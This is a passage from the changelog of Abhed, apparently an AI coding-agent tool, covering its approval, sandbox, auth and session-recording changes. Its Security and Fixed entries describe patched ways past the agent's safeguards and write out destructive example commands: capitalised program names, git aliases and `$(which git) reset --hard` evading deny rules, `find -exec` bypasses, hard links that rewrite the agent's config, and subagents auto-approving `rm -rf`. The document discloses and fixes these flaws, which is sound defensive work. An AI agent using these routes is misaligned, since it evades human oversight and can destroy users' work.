  remove it, or run `cp -p <file> <file>.new && mv <file>.new <file>`.
  `abhed doctor` now fails, rather than reporting ready, when the sandbox
  cannot be built.
- "Always allow" is no longer offered for `git restore`, `git checkout`,
  `git stash` (except `git stash list` and `git stash show`), `cp`, `mv`,
  `uniq` or `tree`; approve those once, or write a rule. Nor is it offered on
  a call that matched an ask rule, and a scope chosen earlier no longer
  satisfies one, so an ask rule such as the console's `web_search` asks every
  time. More git commands now confirm as destructive in every mode, `bypass`
  and allow rules included: `git restore` of the working tree, `git checkout`
  with a pathspec or `-f`, `git switch --discard-changes` or `-f`,
  `git stash drop` and `clear`, `git branch -d`, `-D`, `-f`, `-M` and `-C`,
  `git tag -d` and `-f`, `git worktree remove -f`, any `git clean` but a dry
  run, `git push -f`, `--delete`, `--mirror` or a `+`/`:` refspec, and
  `--output` on any git command (`git diff`, `log`, `show`, `stash show`,
  `stash list` and the rest), with long options shortened too. In a run with
  no one to approve (`-p`, CI, the SDK) these are now refused where an allow
  rule used to run them.
- A reviewer's approval, and a command the person ran at the workbench, are
  now recorded as `actor: user`, as a reviewer's refusal already was, where
  they were `actor: system`; a filter on `actor: system` for approvals no
  longer counts them. `by` is unchanged.
- An SDK approver that remembers scopes should check `Decision.Offer()`, not
  `Decision.Scope`: it is empty for a call that must ask every time.
- In `auth`, `MemoryUserStore.Delete` and `FileUserStore.Delete` now return
  `ErrNoSuchUser` for an account that does not exist, where they returned
  nil, as the Postgres store already did. `SetGroups` now reaches the
  account's live sessions on their next request, and a local session whose
  account was removed is ended on its next request.
- While the account store cannot be read, a request carrying a local session
  now gets `503` "could not check your sign-in", where it got `401`; the
  session is kept, and `/v1/health` and sign-out still answer.
- Signing out is now `POST /logout`. `GET /logout` shows a page with a
  Sign out button and no longer ends the session, so a bookmark or a script
  that fetched it must post instead; a POST from another origin is refused.
  The console, the workbench and the account page already post.
- `auth.require_group` now applies once someone is signed in, and no longer
  to the sign-in page, sign-in, sign-out, `/v1/whoami` or `/v1/health`, which
  it used to refuse to everyone, members included. A signed-in person outside
  the group is signed out and gets the reason: a browser on the front page,
  an API client as `403` with `error` saying which group is missing.
- `abhed user add` now flags the account's password as one to change at first
  sign-in, with or without `-password`, as the documentation said it did. An
  operator creating their own first account sets a new password at
  `/account` once signed in.
- `abhed user remove` of an account that does not exist now prints
  "no such user" and exits 1, where it printed "removed" and exited 0.
- `abhed user add`, `passwd` and `import` refuse a `users_file` that `serve`
  refuses to start with, with the same message, where they used to write it.
- `abhed -p` stopped by a hang-up (SIGHUP) now ends its run and exits 130,
  as for Ctrl-C and SIGTERM; the signal used to end it outright, and the
  shell saw 129.
- `npm install` and `npm test`, `go`, `make`, `cargo`, `kubectl`, `yarn`,
  `pnpm`, interpreters, package runners and any command behind a `VAR=value`
  assignment no longer get a one-click "Always allow"; approve them once
  instead. Allow rules in the configuration and `-allow` flags match exactly
  as before, and a remembered "Always allow" only ever lasted one session, so
  nothing saved is lost. To keep the old flow, write the rule yourself, such
  as `bash(go test*)`, inside a sandbox tier, since it approves whatever the
  agent writes into the tests or the Makefile. A refusal in a run with no one
  to approve no longer names a rule for these commands.
- `abhed resolve` pushes to the issue's repository over https, built from the
  issue URL, and ignores `-remote`. Its git runs without hooks, signing,
  filters (Git LFS included) or `GIT_*` variables; pass `-ca` rather than
  `GIT_SSL_CAINFO`. A change holding a nested repository is not committed. A
  global `insteadOf` that rewrites https to ssh now stops the push; add a
  matching `url.<https base>.pushInsteadOf` to keep pushes on https. The
  push runs outside the checkout, so `includeIf "gitdir:…"` sections of the
  global configuration no longer apply to it: use `-ca`, or host-scoped
  `http.<url>.*` settings. On the process sandbox tier, a push is refused
  when the global git configuration, or the folder it would be made in,
  lies in the run's worktree, a temp folder or a toolchain cache (a home
  directory under `/tmp`, say), and when `~/.abhed/push` is in one of those,
  is a file or a link, or is not your own (not checked on Windows). On the
  `none` tier, or in a container that mounts the home directory, the run can
  write both, and the push is not refused.
- A start with `auth.users_file` or `ABHED_SECRETS_FILE` pointing inside
  the workspace, an added directory, a temp folder or a toolchain cache is now
  refused, unless the file is under the workspace's or the home directory's
  `.abhed/`. Move it to a state directory outside them.
- The `approvals` table gains `answer_scope` and `ended_at`. With two
  database roles, run `abhed migrate` as the owner before starting the new
  server: it refuses to start on the older schema and says so. The migration
  closes the approval rows already in the table, whose turns are not waiting.
- An unbound answer (no `request_id`) to a session no node is running, or
  whose request has ended, now gets `409` instead of `204`: nothing was
  waiting on it.
- `abhed rpc`, `abhed acp` and `abhed resolve` now run `bash` in the
  configured sandbox tier, `process` by default. On a host without one
  (Linux without bubblewrap), a session no longer starts; install it, or set
  `sandbox.min_tier` to `none` for a trusted repository.
- A narrow `bash` allow rule no longer approves a chained or redirected
  command: `bash(go test*)` no longer runs `go test ./... | tee out` unasked.
  In a run with no one to approve (`-p`, CI, the SDK), such a command is now
  refused where it used to run. Split the rule into single commands, use
  `bash(*)` inside a sandbox tier, or approve interactively.
- A custom client of `POST /v1/sessions/{id}/pty` that ignores the new
  `confirm` response field fails closed: a destructive line is not run.
- Only a `bash` call that is just `cd <folder>` now carries its directory to
  the next call, for the agent and the line-by-line terminal. A chain such as
  `mkdir x && cd x` no longer does: send the `cd` as a call of its own.
- A turn waiting for approval when the server shuts down now ends with reason
  `shutdown`, not `user_interrupt`; a filter on `user_interrupt` no longer
  counts server stops.
- A client of `POST /v1/sessions/{id}/approve` should send the `request_id` of
  the `action.requested` event it answers. An answer sent with nothing pending
  now gets `409` instead of `204` (it was held and approved the next request);
  an answer recorded after its turn stopped waiting gets `200`
  `{"recorded":true,"applied":false}`; a bound answer on a node not running the
  session gets `421` with `Abhed-Session-Node`.
- `action.denied` now carries `by`, as `action.approved` does, and both say
  who settled the call: `policy`, `reviewer`, `user`, `session-scope` (with
  the remembered `scope`), `headless` or `system`. A refusal in a run with no
  one to approve (`-p`, `rpc`, an SDK run without an approver) is now
  `actor: system`, `by: headless`, with a reason starting `no approver:`,
  where it was `actor: user` and "rejected"; a filter on `actor: user` for
  reviewers' refusals no longer counts them. A call allowed by an earlier
  "always allow" is `by: session-scope`, not `by: reviewer`. A call that
  needed approval in a run that approves on its own (subagents, `abhed
  eval`) is `by: headless`, where it was `by: reviewer`.
- A request that ends while waiting for approval now records `action.denied`
  (`actor: system`, `by: system`, step `ask`); so does a call refused before
  approval because it could not succeed (step `precheck`), and a call to an
  unknown tool records `action.requested` and `action.denied` (step
  `unknown`). A consumer that pairs every request with an outcome no longer
  finds requests without one.
- A turn stopped before the model's first reply now ends as
  `user_interrupt` or `shutdown`, not `error`. A run ended by its own
  deadline, as `abhed eval` sets per task, now ends with the new reason
  `deadline` at any point, where it was `user_interrupt`: for `abhed eval`
  that is the `terminal_reason` in its report, not its exit status. For an
  embedder, `TerminalReason.ExitCode()` gives 7 for it; `abhed -p` never
  ends this way.
- A new event, `message.dropped`, records a steered message that a shutdown
  kept from being delivered. An `observation` of a `bash` call, the agent's
  or one run on a workbench terminal, now carries `sandbox`, the tier it ran
  under (`none` on the host).
- `abhed serve` now treats a hang-up (SIGHUP) as it treats SIGTERM, draining
  and ending turns, unless it was started with hang-ups ignored (`nohup`).
  `abhed -p`, the interactive CLI, `rpc`, `acp`, `eval` and `resolve` end
  their runs on Ctrl-C, SIGTERM or a hang-up. `rpc`, `acp`, `eval` and
  `resolve` then exit with 128 plus the signal's number (130, 143, 129), where
  the signal used to end them outright. `rpc` and `acp` first write the
  stopped prompt's events, its end included, and then its reply, so the reply
  is the last thing on stdout; a second signal exits at once. A stopped
  `abhed eval` runs no further task, prints no summary and writes no `-json`
  report, and a task whose run was interrupted or shut down never passes. A
  stopped `abhed resolve` keeps its worktree, as a failed run does, and says
  where. With the interactive CLI, `-p`, `eval` and `resolve`, a second
  signal after the first now ends them at once; `serve` ignores signals
  while it drains, so a second SIGTERM does not cut the drain short.
- An agent's `bash` command now runs in a session of its own, with no
  terminal. A command that reads `/dev/tty`, such as a `sudo`, `ssh` or git
  credential prompt, fails at once instead of waiting on the terminal of the
  person running the CLI; give it its input another way. On the host, an
  "Operation not permitted" result no longer carries the note that the
  sandbox denied it.
- `abhed` now refuses a word that is not a command, with exit code 2, where
  it used to open an interactive session, so `abhed version` looked like it
  had run; run a prompt with `-p`. `abhed version` now prints the version. An
  unknown `-output-format`, such as `stream-json`, exits 2 with the valid ones
  named instead of printing text: the formats are `text` and `json` (one
  event per line).
- A piped interactive session that answered an approval with an empty line
  now has to send `a` or `y`: an empty line no longer accepts.

### Added

- `subagent.action` in the parent's record: a subagent's call that was
  refused or put to an approver, with the subagent's `session`, the tool,
  its subject, and `decision`, `step`, `reason` and `by`.
  `subagent.spawned` and `subagent.returned` are now written to the parent's
  record as well as the subagent's, with the subagent's `session`, and the
  subagent's events carry the parent's session as `parent_id`. HawkEYE
  reports a subagent's refused calls (`subagent-denied`) and its allowed
  destructive commands (`subagent-destructive`), and names each subagent's
  session.
- In the SDK: `EvSubagentAction` and the `SubagentAction` payload, for the
  new `subagent.action` event. In HawkEYE's report: `subagent_actions`
  (`hawkeye.Report.SubagentActions`, of `hawkeye.SubagentAction`), the
  subagents' refused and asked-about calls, and `session` on each entry of
  `subagents` (`hawkeye.Subagent.Session`), the subagent's own record.
- In `store`: `ErrSessionExists`, returned when a session is created with an
  id already recorded, and `ErrStepTaken`, returned when a different event is
  appended at a step another writer already recorded (see Upgrading).
- The SDK exports `EvForked`, the `Forked` payload and `Live`, which drops
  the steps a fork abandoned, so a reader outside the module can follow a
  forked record.
- Two additions to the record. `conversation.forked`, with `through_seq`,
  marks a fork: the steps between that step and the marker are kept for
  audit and left out of every rebuild. An `observation` with `not_run` set
  answers an approved call its turn ended before running; HawkEYE does not
  count it as run.
- `GET /v1/sessions` gives a `done` session a `reason`: how its last run
  ended, as recorded (`completed`, `user_interrupt`, `shutdown`, `deadline`,
  `stalled` and so on). `state` is unchanged.
- `config.Config.SetKeys`, the settings any configuration file set, as
  dotted paths, and `Config.Sets` to ask about one, whatever value the file
  gave it.
- `action.approved` and `action.denied` answered by a person carry
  `approver`, the signed-in subject who answered in the console or over the
  API, and an approval carries `granted_scope`, the scope the person chose to
  always allow with it. HawkEYE and the workbench's chat line name the
  approver. In the SDK: `Answer.Approver`, `Answer.Granted` and
  `Decision.Offer()`.
- In `auth`: `ErrSamePassword`, which `(*LocalAuth).ChangePassword` returns
  when the new password equals the current one.
- In `auth`: `VersionedUserStore`, an account store that can say whether
  any account changed, implemented by `MemoryUserStore.Version` and
  `FileUserStore.Version`; `(*LocalAuth).CheckNewUser`, which reports why an
  account could not be created without creating it; `(*LocalAuth).Verify`
  and `ErrAccountUnchecked`, to tell an account store that cannot answer from
  a sign-in that ended; and `(*LocalAuth).HasSession`.
- In the SDK: `NoteAnswer` and `Answer`, for an approver to say who settled
  a call when no person was asked, and the `By` values it takes
  (`ByPolicy`, `ByReviewer`, `ByUser`, `BySessionScope`, `ByHeadless`,
  `BySystem`); `DroppedMessage` and `EvMessageDropped` for the new
  `message.dropped` event; `TermDeadline` for the new `deadline` terminal
  reason. See [the SDK guide](docs/guide/09-sdk.md#who-settled-a-call).
- `Agent.Flush` in the SDK waits until `OnEvent` has returned for every
  event recorded before the call, or its context ends. `OnEvent` is now
  given every event, in order, however slow it is; before, events recorded
  while it was busy could be dropped, and so could one recorded the moment
  `New` returned. Give `Flush` a deadline, and do not call it from `OnEvent`.
- The line-by-line workbench terminal completes a file or folder name on Tab,
  from the workspace listing and relative to the terminal's directory; a
  second Tab lists the candidates. Nothing is run to complete. Names are
  quoted as bash quotes them, and a name with control, invisible or
  text-direction characters is never offered, so a completed line runs as
  it reads; nothing is completed inside an open quote, open backticks or
  an open `$(`. Ctrl \` leaves the terminal from the keyboard, now that Tab
  stays in it.

### Changed

- `(*auth.LocalAuth).RevokeUser` matches the username without regard to case,
  as sign-in already does, so revoking `Alice` also ends `alice`'s sessions.
- `server.ApprovalStore` changed for the approval fixes below: `AnswerApproval`
  takes the answer's scope, `ApprovalResult` returns it, and `EndApproval` is
  new. `store.Postgres` implements the new methods, and `store.Approval` gains
  `AnswerScope` and `Ended`. A store written against the old interface must
  add them.
- `agent.NewUndoLog` takes the functions that restore and remove a file;
  both are required, and the CLI and the server pass the session's
  `RestoreFile` and `RemoveFile`. Undo without them refuses rather than
  writing by path.
- `sandbox.Policy` gains `StatePaths`, the state files a configuration keeps
  outside `.abhed/`, which the process sandbox also denies to commands. A
  start with one where commands can write is refused (see Security).

### Fixed

- No sign-out control worked in Chrome: the workbench's Sign out and Switch,
  the console's, the account page's and the `GET /logout` page's button all
  posted a form, which Chrome sends as `Origin: null` under the server's
  `Referrer-Policy: no-referrer`, and the origin check refused it. They now
  sign out with a same-origin `fetch` and go where the answer says, which
  keeps an identity provider's own sign-out. The origin check also accepts
  `Origin: null` when the browser says `Sec-Fetch-Site: same-origin`, so the
  confirm page's form works without script.
- The console's session pill kept saying RUNNING through a drain: it changed
  only on the next list request, and none succeeded once the server had
  gone. It now changes when the session's end renders.
- A member dropped from `auth.require_group` saw only "forbidden" in the
  workbench, which still said connected, and a reload landed on sign-in with
  no reason. The workbench now shows the reason and its signed-out state,
  and a reload within ten minutes shows the reason on the sign-in page.
- `abhed user passwd <name> -password X` ignored `-password` and printed a
  generated password; `user passwd -password X <name>` answered "no such
  user". Both forms now set the given password, which must still be changed
  at the next sign-in.
- Plan mode put a destructive command or an ask-rule command to the person,
  and ran it if accepted, because those steps came before the mode. Plan
  mode now refuses a mutating call first, as plan mode; read-only calls are
  allowed as before.
- Two interactive CLIs whose first task started in the same second shared a
  session id, and on Postgres one's record was merged into the other's or
  dropped without an error. Each session now gets a random id, and a
  clashing id or step is refused rather than ignored.
- An "always allow" scope outlived its session: after `/clear` or
  `/resume`, a scope chosen in the previous session still approved calls in
  the next, with the grant missing from that session's record. It now ends
  with the session, as documented.
- Opening a finished session in the workbench on Postgres, only to view it,
  claimed it: its row lost its end and reason, other nodes listed it as
  running, and a `/resume` elsewhere was refused. A viewed session now keeps
  its recorded end. The first write, a message or workbench work, claims it
  and first catches up on what another process recorded; while another
  process runs it that write is refused (`409`). A claim for workbench work
  alone is given back after two quiet minutes, or at shutdown, with the end
  it was opened with, and a message refused during a shutdown claims
  nothing. Terminal actions the record refuses are now reported instead of
  dropped.
- A second Ctrl-C that exited while the turn was still stopping recorded
  the session's end as `error`; it is now `user_interrupt`, and no second
  end is written when the turn recorded its own.
- A `task` call made with the `tasks` tool's arguments answered only that
  a prompt is required, and a model could retry it until the turn limit.
  The error now points to the `tasks` tool.
- The SDK's `Agent.Fork` documentation said only that it discards what came
  after; it now says that 0 keeps the whole conversation, that a
  `conversation.forked` event is recorded, and that an abandoned or
  past-the-end step is refused. The `/resume` and `/clear` descriptions in
  the architecture and permissions docs now match the sessions guide.
- A turn with several tool calls, stopped at one of them, left the calls
  after it with no result, so the conversation's next request was refused
  by the provider. A conversation rebuilt from the record (a continued
  session, `/resume`, `/fork`) had the same gap for any refused call, and
  a fork placed after a turn with a refused call dropped that turn and all
  that followed it. Every call now gets an answer, live and when rebuilt:
  a refused call says so with its reason, one the turn ended before says it
  did not run, and one with no recorded result says it may have run. A
  rebuild also keeps each model turn apart and its results in call order.
- A model call stopped part way recorded 0 tokens in and out, however long
  it had streamed. It now records the usage the provider had reported by
  then, such as the prompt tokens Anthropic sends when a reply starts. Most
  OpenAI-compatible servers report usage only when a reply ends, so a call
  stopped there still records none.
- New file or New folder with a collapsed folder selected could lose its
  name input, with a page error, when the folder's listing arrived after
  the input was shown. A redraw of the tree now waits while a name is being
  typed.
- The workbench ignored `message.dropped`: after a shutdown dropped a queued
  message, its bubble still said "still queued for the next step" and
  offered Send now and Cancel. It now reads "Not delivered", with the
  reason, and the text goes back in the message box.
- The console's shutdown, deadline and stalled pills could never appear:
  the session list said only running, done, idle or waiting for approval,
  so an interrupted session read "done" and a drained one stayed "running".
  The pill now shows how each session's last run ended, from the list's new
  `reason`, and the open session's pill follows its record at once.
- A workbench page with nothing running kept showing "● connected" after
  the server stopped, until the person acted. A visible idle page now asks
  the server every few seconds and shows offline soon after it goes.
- In the workbench's line-by-line terminal, a `cd` into a folder with a `$`
  in its name, written as Tab escapes it (`cd price\ \$5\ plan/`), ran as a
  command: the next line ran in the folder while the prompt still showed the
  old one. It is now followed at once, and the prompt moves with it.
- The `write` tool refused a new file whose folder did not exist yet, so in
  `accept-edits` and `auto` mode a new file in a new folder needed a shell
  approval for `mkdir`, and a headless run could not make it at all. It now
  creates the missing folders inside the workspace, one at a time under the
  same guards as the write: none may be Abhed's state or lead out of the
  workspace. A failed write takes the folders back, and `/undo` of the file
  removes them while they are empty.
- `abhed hawkeye` refused the event stream `abhed -p -output-format json`
  writes, one event per line, as "not an exported events file". It reads
  that as well as an `/export` array.
- A stop signal (SIGTERM or a hang-up) in the first second or two of
  `abhed -p`, while it was still starting up, ended it by the signal's
  default action, exiting 143 or 129 with no output. It now ends the run as
  an interrupt and exits 130.
- The process tier never applied `sandbox.max_procs` or
  `sandbox.max_memory_mb`, and the test meant to cover it ran a busy loop,
  not a fork bomb. A command or workbench shell on the process tier now starts with a
  process limit of what the user runs plus `max_procs`, so it can start at
  most that many more; memory is still bounded only on the container and vm
  tiers, which the docs now say; `abhed doctor` warns when `max_memory_mb`
  is set for a tier that ignores it, and when root runs the process tier. A
  command stopped at its timeout now also ends the processes it started that
  left its group with `setsid`, while their parent still ran.
- On a configuration that denies `rm` by its command text, such as the
  console's `bash(rm -*)`, every Delete in the Explorer was refused: a
  delete was screened as the line `rm -- '<path>'`. New folder, rename and
  delete are now judged and recorded as actions of their own, `mkdir`,
  `rename` and `delete`, still carried out in the sandbox and recorded as the
  person's (`by: user`). Write rules on the paths, rules naming the action
  (`delete(**/keep/**)`) and plan mode still refuse them.
- Isolated subagents and `abhed resolve` could not change anything: their
  worktrees were made under `.abhed/worktrees/`, inside Abhed's own state,
  which the file tools and the command sandbox refuse, so every write in a
  worktree was refused and resolve always reported that the agent changed
  nothing. Worktrees are now made in `.abhed-worktrees/`, beside the state,
  and a link planted there is refused. A subagent's worktree is removed
  with its branch only when it is exactly as it was made (no change, commit
  or ignored file), and so are a resolve's worktree and `abhed/issue-<n>`
  branch. A resolve run's own commits on its branch are pushed; commits left
  on a detached HEAD or another branch stop resolve, which keeps the
  worktree and says where they are. A resolve run's commands can no longer
  read the repository's own `.abhed/` from the worktree.
- Under ACP, a call allowed by the editor's earlier "Always allow" was
  recorded `by: reviewer` with no scope; it is now `by: session-scope` with
  the `scope`, as on the CLI and the server.
- A failed invite sign-up, for a taken name or a short password, no longer
  uses up the invite: the account is checked before the code is redeemed.
- The workbench and the console notice a sign-in that ended, whether by a
  restart, a sign-out elsewhere or an administrator: they say "Your sign-in
  ended" with a link to sign in again, and stop showing the run as live.
- The container sandbox tier failed every command on Docker, which refuses
  `--uts private`; it now runs there as it does on Podman. The sandbox's
  hostname is now always `abhed`, and on Podman its PID and UTS namespaces
  are pinned private whatever `containers.conf` says.
- On Debian and Ubuntu, the container image included, commands linked
  through `/etc/alternatives` (`vi`, `vim`, `editor`, `awk` and others) could
  not start in the Linux process sandbox.
- A request that ended while waiting for approval, by an interrupt, Send
  now, a shutdown or a deadline, recorded no outcome: the record went from
  `action.requested` straight to `session.ended`. It now records
  `action.denied` saying why no one answered, such as "interrupted before an
  answer" or "server shut down before an answer".
- The record credited a reviewer who was never asked. A refusal in a run
  with no one to approve read as a person's rejection, and a call allowed by
  an earlier "always allow" read as a reviewer's approval with no scope. Each
  now says who settled it, and the scope that allowed it.
- A turn stopped before the model's first reply, by an interrupt, Send now or
  a shutdown, was recorded as `error`, as if the model had failed.
- Stopping a turn, or the server, did not stop an approved long-running
  command: the turn ended only when the command did, and on SIGTERM what the
  command started could outlive the server. A cancel now kills everything
  the command started while it runs, in every sandbox tier, and removes a
  container command's container. A job the command leaves running in the
  background after it exits is not killed, but no longer holds the call
  open, and the result says it is still running. Closing the terminal the
  CLI runs in, or losing the ssh session, ends the command the same way.
  A command stopped by the run's own time limit says so, instead of
  suggesting a longer `timeout_ms`.
- A message steered into a running turn (202 "steered") just before a
  shutdown was lost with no trace. It is now recorded as `message.dropped`.
  It is still not delivered after a restart.
- When a shutdown ended a command on an idle workbench's terminal, its result
  was recorded after the session's end. It is now recorded before it.
- A call to a tool that does not exist left no action on the record, only
  the model call that asked for it, and a call refused before approval
  because it could not succeed (a relative path, an edit whose text is not
  in the file) left its request with no outcome.
- HawkEYE showed a call with no result as run (✓), including one whose
  approval was never answered; it is now marked not run. A command the
  sandbox refused part of is marked and raises a `sandbox-denied` finding,
  for records that say the command ran under a sandbox.
  HawkEYE says who decided from the event itself, so the person's own
  decline at the line terminal no longer reads "by reviewer", and a headless
  refusal or a remembered scope no longer counts as asking a reviewer.
- Ctrl-C in an interactive session did nothing while a turn was running or
  an approval was waiting, though the banner says it interrupts. It now
  stops the turn and refuses a waiting approval; a turn stopped at an
  approval, a running command or while waiting for the model ends as
  `user_interrupt`. At the prompt Ctrl-C still only clears the line; Ctrl-D
  exits. A second Ctrl-C during a turn that has not stopped ends the session
  with exit code 130.
- The agent's `bash` refused `vim -es`, `vim -e -s`, `vim -E -s` and other
  silent Ex mode edits as interactive. They run a script and exit, so they
  now run; `vim` without them, `vim -e` or `vim -s` alone, and `-s` before
  `-e` (a file of keys, not silent mode) are still refused. An allow rule
  such as `bash(vim -es*)` allows any command, through `:!`.
- The "always allow" offered for `python3 -m unittest -q test_calc` was
  `bash(python3 *)`, which also approved `python3 -c …`. A one-click
  always-allow is now offered only for a short list of well-understood tools
  and subcommands (`git status`, `git commit`, `ls`, `cat`, `grep`, `mkdir`,
  `npm ls`, `docker ps` and a few more, listed in the permissions guide);
  anything else can be approved once or allowed with a rule you write.
  `npm install`, which used to be offered one, is not: it runs package
  scripts. Nor is a command with a `VAR=value` assignment in front.
- Send now during a server drain took the message out of the queue before the
  server refused it, so it was lost to the server and kept only in the page.
  The workbench now asks `/v1/health`, which reports `draining`, and leaves
  the message queued; if the drain starts in between, it says the message is
  no longer queued and puts its text back in the message box.
- The workbench kept showing "connected" after the server had gone. A dropped
  event or shell stream, or a request that cannot reach the server, now shows
  "reconnecting…" or "offline" until the server answers again.
- In the line-by-line workbench terminal, `vi` seemed to hang after `:wq`:
  the process sandbox refuses writes to the home directory, and vim waited at
  "Press ENTER" after failing to save its history file. Every process-tier
  command, the agent's included, now starts vim with that file turned off,
  after reading the person's own vimrc (a vim without scripting, such as
  vim.tiny, reads none). Neovim's history file is turned off the same way,
  though not yet tested. On Linux the sandbox shows no home directory, so vim there runs
  with its defaults.
- Tab in the line-by-line terminal moved focus out of it, to the agent's
  composer, so the next keys went there. Esc, Left and Right no longer put
  `[D`-style text into the line, and a program that is killed no longer
  leaves its screen or key modes behind for the line prompt.
- A `cd` whose folder name was quoted, as `web\ app` or `"web app"`, left
  the line-by-line terminal where it was without a word, so the next line
  ran in the old folder. The quoting is now read as bash reads it, and a
  bare `cd` goes to the workspace root instead of doing nothing.
- The tracked directory, for the line-by-line terminal and the agent's
  commands alike, now moves only for a line that is just `cd <folder>`. It
  used to follow the last `cd` of a chain such as `mkdir x && cd x`, and
  could land in the wrong folder when an earlier part of the line had
  changed directory. A line with `cd`, `pushd`, `popd`, `CDPATH`, `eval` or
  `source` in it, or a `cd` to a folder that is missing or cannot be read
  with confidence, leaves it where it was and says so, naming where the next
  line runs; the agent's result carries the same note. Commands run without
  a sandbox no longer get the server's `BASH_ENV` or `CDPATH`.
- On a phone, the sign-in page's header lost its side margin, so the logo sat
  against the left edge of the screen.
- Between phone and desktop widths the console header was wider than the
  screen and the page scrolled sideways. From 761 to 1180 pixels it now shows
  the mark without the wordmark and "console" label, the health light (its
  text stays for screen readers), and no active-session count or Password
  link (for local accounts the signed-in name links to the account page);
  the model picker and Switch stay. At every width the header items keep
  their size and the signed-in name shrinks into what is left, so a long name
  no longer pushes Sign out off the screen.
- On a phone the console had no model picker and no Switch link, which an
  identity-provider sign-in needs to change user; both now sit at the foot of
  the chat rail. The header shows the health light, and below 400 pixels
  leaves the Admin link to the landing page. The workbench keeps its Switch
  link at every width.
- Stopping the server (SIGTERM) while a turn was running, most often while it
  waited for approval, could exit before the turn recorded `session.ended`,
  so the session listed as running forever. The server now waits, up to five
  seconds, for cancelled turns to record their end before it returns, and a
  turn waiting for approval no longer waits on a slow approval write once
  cancelled. Such a turn ends with reason `shutdown`, as other cancelled
  turns do, where it used to record `user_interrupt`, and so does a turn
  stopped before the model's first reply. A turn started by a
  message to an open session, which is every workbench turn, is now ended
  on shutdown too; before, the server waited on it and exited with no end
  recorded. While the server is stopping, a message to a session gets 503
  with `Retry-After`, whether it would start a turn, steer a running one or
  send it now, and a Send now no longer stops a turn the drain is letting
  finish.
- In a workbench session whose event stream was already open, for example
  after opening a terminal, the first message that needed approval stayed at
  "Thinking" and never showed Allow or Deny, so the run waited for an answer
  no one could give. The prompt now shows on the first turn, after Send now,
  and when the page opens on a session that is waiting for approval.

### Security

- The origin check on state-changing requests now accepts `Origin: null`
  when, and only when, the browser sends `Sec-Fetch-Site: same-origin`, on
  every route. Chrome sends this server's own form posts that way under its
  `Referrer-Policy: no-referrer`; page script cannot set the header, and an
  opaque or other-site initiator is marked `cross-site`. A null origin with
  the header missing, or `same-site`, `cross-site` or `none`, is still
  refused.
- A folder delete from the Explorer escaped a `delete(...)` rule, and a
  folder rename a `rename(...)` rule, on what it held: the rule was put to
  the folder's own path only, so deleting `keep`, or any folder above it,
  got past `delete(**/keep/**)`, and renaming `locked` got past
  `rename(**/locked/**)`. The action's rule is now put to every entry the
  walk visits, and for a rename to each entry's new path too.
- An Explorer rename was not held to `delete(...)` rules at all, so renaming
  `vault`, or a folder above it, got past `delete(**/vault/**)`, and a file
  could be moved out of `vault/` and then deleted from its new place. A
  rename removes what was at its old path, so the old path and every entry
  inside a folder are now also put to `delete(...)` rules, and a deny
  refuses the rename. A `delete(...)` ask rule is recorded as the rename's
  reason and, like any ask in the Explorer, taken as answered, so it does
  not prompt. An ask from any path an Explorer action is judged by, not only
  its own, is now recorded as the action's reason.
- A hard link inside the workspace to a state file of an enclosing folder,
  such as the repository root's `.abhed/config.json` when the session starts
  in `services/ledger`, let a command rewrite that config for the next run
  at the root: the start-time link check covered only the state the run
  itself loads. It now covers the `.abhed` state of every folder above the
  workspace, at every entry point that builds the sandbox.
- Subagents approved every ask on their own: the CLI built them with an
  approver that said yes, so a subagent's `rm -rf`, `git commit` under an
  ask rule, or any default-mode command ran with nobody asked, in every mode
  plan included, and in `-p` too. The parent's record held only the `task`
  call and the summary, and HawkEYE reported nothing. A subagent now answers
  to its parent's approver (the prompt, or the headless refuser), and its
  refused and asked-about calls are in the parent's record and report.
  `limits.nested_subagents: false` was not enforced either: a subagent could
  spawn its own. It now cannot, and when nesting is on, a nested subagent's
  events reach the top-level record.
- A path rule written relative to the workspace, such as
  `write(docs/**/frozen/**)` or `delete(apps/**/vault/**)`, never matched:
  it was compared only with the absolute path the agent and the Explorer
  send, so the write, delete or rename went ahead. Deny and ask path rules
  now also match the path relative to the workspace and to each added
  directory, with or without a leading `./`, and the path with its links
  resolved. Allow path rules match only the resolved target, absolute or
  relative to the workspace. Absolute and `**/` rules match as before.
- On macOS and Windows a capitalised program name got past deny, ask and
  destructive checks: `WHOAMI` past `bash(whoami*)`, `GIT tag` past an ask
  rule, and `GIT reset --hard`, `Git checkout -- .` and `RM -rf` ran with no
  confirmation in modes that approve commands. Program names are now compared
  without case there, in rules, the destructive check, wrappers and scopes;
  a rule still matches as written too, so folding only adds a match.
- The destructive git check missed a git alias and a git named by a
  substitution: `git -c alias.wipe='reset --hard' wipe`,
  `git --config-env=alias.x=X x` and `$(which git) reset --hard` discarded
  work with no confirmation under `bypass`, `auto` or an allow rule. A git
  subcommand git does not have (an alias or extension), a `-c` or
  `--config-env` that sets an alias or include, and a git named by a
  substitution that spells git are now destructive, as are
  `git read-tree -u`, `git checkout-index -f` and `git update-ref`.
- `find … -exec`, `-execdir`, `-ok` and `-okdir` ran a command a deny rule
  names, such as `find . -exec whoami \;` past `bash(whoami*)`. The command
  after them is now matched like one after `xargs`.
- A user told to change a temporary password could clear that demand by
  entering the same password as the new one; `/v1/password` now refuses a
  new password equal to the current one. A self-service password change
  also signs out the user's other sessions, keeping the one that made it:
  at once on the server that made the change, and on any other server
  sharing the account store when that session next reads its account.
- A hard link in the workspace to a state file let a sandboxed command rewrite
  `.abhed/config.json` (and so drop a deny rule for the next start): the file
  tools refused the link, but the command sandbox guards `.abhed` by path,
  and a second name is an ordinary path. The agent cannot make such a link
  on macOS; one that already existed was enough. Every entry point that
  builds the sandbox (the CLI, the server, `abhed rpc`, `abhed acp`,
  `abhed resolve`) now refuses to start, and `abhed doctor` fails, when a
  state file has more than one name, and a configuration file with more than
  one name is not loaded. The message names the file and how to fix it.
- An upload refused because the `uploads` folder was a link into Abhed's
  state (`uploads -> .ABHED`, a link through another link, or a link to a
  folder of `.abhed` not made yet) still made an empty folder inside
  `.abhed` before the refusal. Folders are now made one step at a time under
  the workspace, each step judged by name and, once opened, by identity, and
  a step that is or leads into the state is refused before anything is made.
- One "Always allow" on a harmless git command approved the ones that
  discard work: taking it on `git restore --staged x`, `git checkout HEAD --
  x` or `git stash list` let `git restore .`, `git checkout .`,
  `git stash drop` and `git stash clear` run unasked for the rest of the
  session, and uncommitted work or a stash was lost. Those subcommands no
  longer get a subcommand-wide scope, and the discarding forms of git that
  Abhed recognises, listed in the permissions guide and matched with long
  options shortened as git accepts them, are destructive commands that
  confirm in every mode, which no remembered scope or allow rule satisfies.
  The check is best effort: a single-file `git checkout FILE`, a git alias
